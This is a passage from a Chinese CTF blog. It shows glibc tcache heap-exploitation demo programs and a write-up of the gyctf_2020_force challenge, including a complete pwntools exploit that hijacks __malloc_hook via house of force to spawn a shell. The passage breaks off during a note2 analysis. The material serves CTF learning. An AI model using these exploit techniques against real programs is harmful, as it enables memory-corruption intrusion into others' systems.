class=""><p><code>calloc</code>有个特点，就是不会去<code>tache</code>里面拿堆块，不去拿就算了，还要把对应大小的堆块放进<code>tache</code>里面，这就正好了呀！这直接就把<code>stack_var</code>放进<code>tache</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure><img src="/2021/10/05/tache-bin-attack/12.png" class="" width="12"><p>由于第一个堆块就是<code>stack_var</code>，直接<code>malloc</code>就能得到栈上的控制权</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="built_in">malloc</span>(<span class="number">0x90</span>); </span><br></pre></td></tr></table></figure><p><code>gyctf_2020_signin</code>这题差不多就是按照<code>tcache_stashing_unlink_attack</code>改编而成的，感兴趣可以去看看《buu刷题记之PWN系列》，<code>calloc</code>的细节也有提到…</p><h3 id="libc-2-31-so"><a href="#libc-2-31-so" class="headerlink" title="libc-2.31.so"></a>libc-2.31.so</h3><h4 id="tcache-poisoning-1"><a href="#tcache-poisoning-1" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h4><p>和<code>libc-2.27.so</code>一样的，不多说了….</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// disable buffering</span></span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tcache-house-of-spirit-1"><a href="#tcache-house-of-spirit-1" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h4><p>死性不改呀！😂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tcache-stashing-unlink-attack-1"><a href="#tcache-stashing-unlink-attack-1" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h4><p>写了个寂寞….</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>参考《buu刷题记之PWN系列》</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>​        总的来说，加入<code>tache</code>让堆题的可玩性增加了不少，但利用的手法都不是很复杂，只能说开发者在安全性和效率之间，更偏向于效率，才导致这么多问题出现，以前对<code>tache</code>的题目很恐慌。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF小知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu刷题记之PWN系列</title>
      <link href="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/"/>
      <url>/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h3 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf_2020_force"></a>gyctf_2020_force</h3><h4 id="0x00-基本信息"><a href="#0x00-基本信息" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/1.png" class=""><p>保护全开，GOT也写不了，看这个名字就感觉是house of force….</p><h4 id="0x01-IDA分析"><a href="#0x01-IDA分析" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/2.png" class=""><p>正好印证了之前的猜测，满足house of force的条件：</p><p>可覆盖Top chunk为-1</p><p>能够分配任意大小的堆块以及分配的次数</p><p>先试一下覆盖Top chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">heap_base = add(<span class="number">10</span>,payload)</span><br></pre></td></tr></table></figure><p>没啥毛病！不记得回去看看house of force</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/3.png" class=""><p>接下来就是想着任意地址堆块分配到哪里去了，前面看到保护全开，其实我第一想法是覆盖GOT表的，但是RELOC保护全开了，没办法了！只能覆盖malloc_hook，写one_gadget了</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/4.png" class="" width="4"><h4 id="0x02-解题思路"><a href="#0x02-解题思路" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h4><p>1.泄露libc，heap基址</p><p>2.修改Top chunk的size为-1</p><p>3.劫持__malloc_hook修改one_gadget，这里需要realloc改变栈环境</p><h4 id="0x03-完整EXP"><a href="#0x03-完整EXP" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./gyctf_2020_force&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;node4.buuoj.cn&#x27;, 26108)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./gyctf_2020_force&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;2:puts\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;addr &#x27;</span>)</span><br><span class="line">    heap = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content\n&#x27;</span>, content)</span><br><span class="line">    <span class="keyword">return</span> heap</span><br><span class="line"></span><br><span class="line">libc_base = new(<span class="number">0x200000</span>, <span class="string">&#x27;aaa&#x27;</span>) + <span class="number">0x200ff0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base : &#x27;</span> + <span class="built_in">hex</span>(libc_base)</span><br><span class="line">heap_base = new(<span class="number">0x18</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;heap_base : &#x27;</span> + <span class="built_in">hex</span>(heap_base)</span><br><span class="line">top = heap_base + <span class="number">0x10</span></span><br><span class="line">malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + libc_base</span><br><span class="line">offset = malloc_hook - top</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;offset : &#x27;</span> + <span class="built_in">hex</span>(offset)</span><br><span class="line">realloc = libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>] + libc_base</span><br><span class="line"></span><br><span class="line">onegadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf0274</span>, <span class="number">0xf1117</span>]</span><br><span class="line">one = onegadget[<span class="number">1</span>] + libc_base</span><br><span class="line">new(offset - <span class="number">0x33</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span> + p64(one) + p64(realloc + <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;2:puts\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><h5 id="1-libc基址的获取"><a href="#1-libc基址的获取" class="headerlink" title="1.libc基址的获取"></a>1.libc基址的获取</h5><p>我们通过IDA看到，当成功分配一个堆块的时候，会将此堆块的地址打印出来，那么当堆块size过大的时候，它会通过mmap来分配堆块，此堆块的分配会紧挨着libc，就能利用输出的堆地址计算libc地址</p><h5 id="2-realloc平衡原理"><a href="#2-realloc平衡原理" class="headerlink" title="2.realloc平衡原理"></a>2.realloc平衡原理</h5><p>我们在劫持完__malloc_hook修改成one_gadget的时候，发现四个one_gadget都不能getshell，那么可以考虑通过realloc来平衡栈，实现one_gadget，下图我们可以看到除了第一个one_gadget的条件是rax的值为NULL，其他的都是栈上的某一个位置的值为NULL，所以用realloc来平衡栈就可以getshell了！！</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/12.png" class=""><p>我们知道啊，当进行malloc的时候呢，是先判断__malloc_hook的值是否为空，如果不为空就跳到这个值的地址上去，那么我们填上realloc的地址，就可以跳到realloc上去</p><p>realloc之所以能够调整栈帧，是因为进入realloc函数之后会push一系列的参数进去，接着和__malloc_hook一样，判断realloc_hook是否为空，不为空就跳转进去执行，需要注意的是要控制好psuh参数的个数，也就是加上一定的偏移</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/13.jpg" class=""><p>所以执行流程是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc —&gt; __malloc_hook —&gt; realloc —&gt; __realloc_hook —&gt; one_gadget --&gt;getshell</span><br></pre></td></tr></table></figure><p>实际的操作中还是去试偏移会快一点….</p><h3 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h3><h4 id="0x00-基本信息-1"><a href="#0x00-基本信息-1" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/5.png" class=""><p>可以写GOT表…</p><h4 id="0x01-IDA分析-1"><a href="#0x01-IDA分析-1" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/6.png" class=""><p>经典菜单题，一个函数一个函数看吧！</p><h5 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/image-20210818154940988.png" class=""><p>分配note的数量限制在4个以内，大小限制为0x80以内，但是需要注意的是它没有限制堆块的大小不为0，接下来就是读入content</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/7.png" class=""><p>刚刚说到它没有限制堆块大小为0，那么当size也就是a2为0的时候，a2 - 1 = -1，与无符号变量i进行对比的时候，-1将转化成最大的无符号数，那么就可以实现溢出了</p><p>除此之外，程序还维护了一张堆块的信息表，一看到这第一反应肯定是劫持这个堆块表</p><img 